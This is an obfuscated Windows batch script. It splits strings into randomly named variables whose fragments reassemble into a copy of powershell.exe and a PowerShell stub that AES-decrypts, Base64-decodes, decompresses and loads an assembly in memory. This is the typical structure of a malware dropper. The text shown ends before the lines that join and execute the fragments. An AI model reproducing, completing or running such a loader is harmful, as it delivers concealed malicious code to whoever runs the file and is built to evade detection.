@echo off
set "WXAoRpTtuO=:\"
set "dOdISeqTBO=ow"
set "cKIknRWjHR= C"
set "ygskQajgwg=po"
set "PnFxJkZyOY=.e"
set "hFKSJlqQZn=he"
set "TBetfzMTWO=em"
set "MaFoINNiQL=32"
set "DWcZzlzNRt=\W"
set "xfPUtwFUGf=he"
set "YIJGXZYLAP=co"
set "qFudLFfmxs=0\"
set "BetxqWzajk=we"
set "EtiIrjuGhM=Wi"
set "pvaoLPpzPm=st"
set "ZZbCvKPYeL=Po"
set "vHwbPoPLGY=do"
set "GAcCjJBaTe=s\"
set "zZTtNAmjEC= /"
set "mjcXpTWWqV=ll"
set "VgBcdTZnjz=y "
set "wNhTrmsgXo=rS"
set "tckGkWlIOs=in"
set "JohUwSdSXS=rs"
set "xxWIymRili=\v"
set "ExIxNQPSGa=we"
set "chJeJWyfTU=ws"
set "bQhseAUwrO=py"
set "rIbPnvpyeU=1."
set "ZOwgxoaysf=nd"
set "zQHUwYNlOM=ll"
set "xqbUShAtQC=Sy"
set "XriDZYMPOC=xe"
set "EHPpRbyoGk= %~dp0"
set "BTxNTBiQKk=cd"
set "ytHJTCkINk=em.C"
set "AcyOryIBlC=VL.T"
set "jEKoxGsKHd=e = "
set "SFrwBEFhDC=Syst"
set "erRZmrpPKj=ress"
set "MWRIKwHnld=n ''"
set "GJBftUvFCa=.Ass"
set "ppIFdKwNkS=pDZz"
set "knSMajkQRS=TllA"
set "kpcfbYHPMY=);$g"
set "obeXIqZFLV=O.Me"
set "qsKMxLZIHp=n ''"
set "oVMRWQqytJ=tem."
set "WghmIeEfkG=rity"
set "xXXwoiIUnw=::('"
set "QPPtNCJKTX=16] "
set "OoaQntQodJ=raph"
set "jbKsSKKzpX=Conv"
set "ljkAYybMNM=mory"
set "rbIkXEEYEV=and "
set "mNlgFpuKyI=-1.."
set "jqqXnUYTao=736u"
set "EKwMuMYkaJ=gMod"
set "XegcCammnL=eUOg"
set "CdyEYlcYUk=F'[-"
set "jSSowMFOWq=ress"
set "tQNDCFDJyL=$rPn"
set "yIpGBKFcbC=[]] "
set "jkfPbrOBkx=esFX"
set "KqfFAWTUzL=pose"
set "iodhdidFrn=ct S"
set "RZriqVxeJT=r = "
set "CabfWtQVsv=ddin"
set "zEXSivaynZ=File"
set "TeflXzgxtD=ddin"
set "FGavrjqkrO=yste"
set "SshhEjHarC=Star"
set "CMgIhAzUmt=m.Pa"
set "PKLLbJjOSO=PKCS"
set "PlcODeMFKP=vert"
set "rJMkLVmMfU=t = "
set "EhqwesgnVH=ss -"
set "yXuqAjGsUf=New-"
set "LcGeakDamL=n.En"
set "MNWbwSWmSG=vVL "
set "sZCUdpjVjZ=UOgr"
set "mAdZflmngn=ptog"
set "byBpiltFsn=[IO."
set "sWplnqgpgD=daeR"
set "YeXhSTcFrC=ptor"
set "reUpmdKxyL=esMa"
set "GEJcCYBOdq=ionM"
set "aVfVctROqK=vVL."
set "QkKHUYVoIu= [st"
set "WAwvVpXuCP=eUOg"
set "GwhoibKTCR=+hAO"
set "RqYWnoCXHe=Mode"
set "FsIxVlfZaL=Sr ="
set "APaUupADvi=form"
set "xedmdKTaCZ=Disp"
set "HlanusHzVo=).Sp"
set "vvcszFMQlp=gnir"
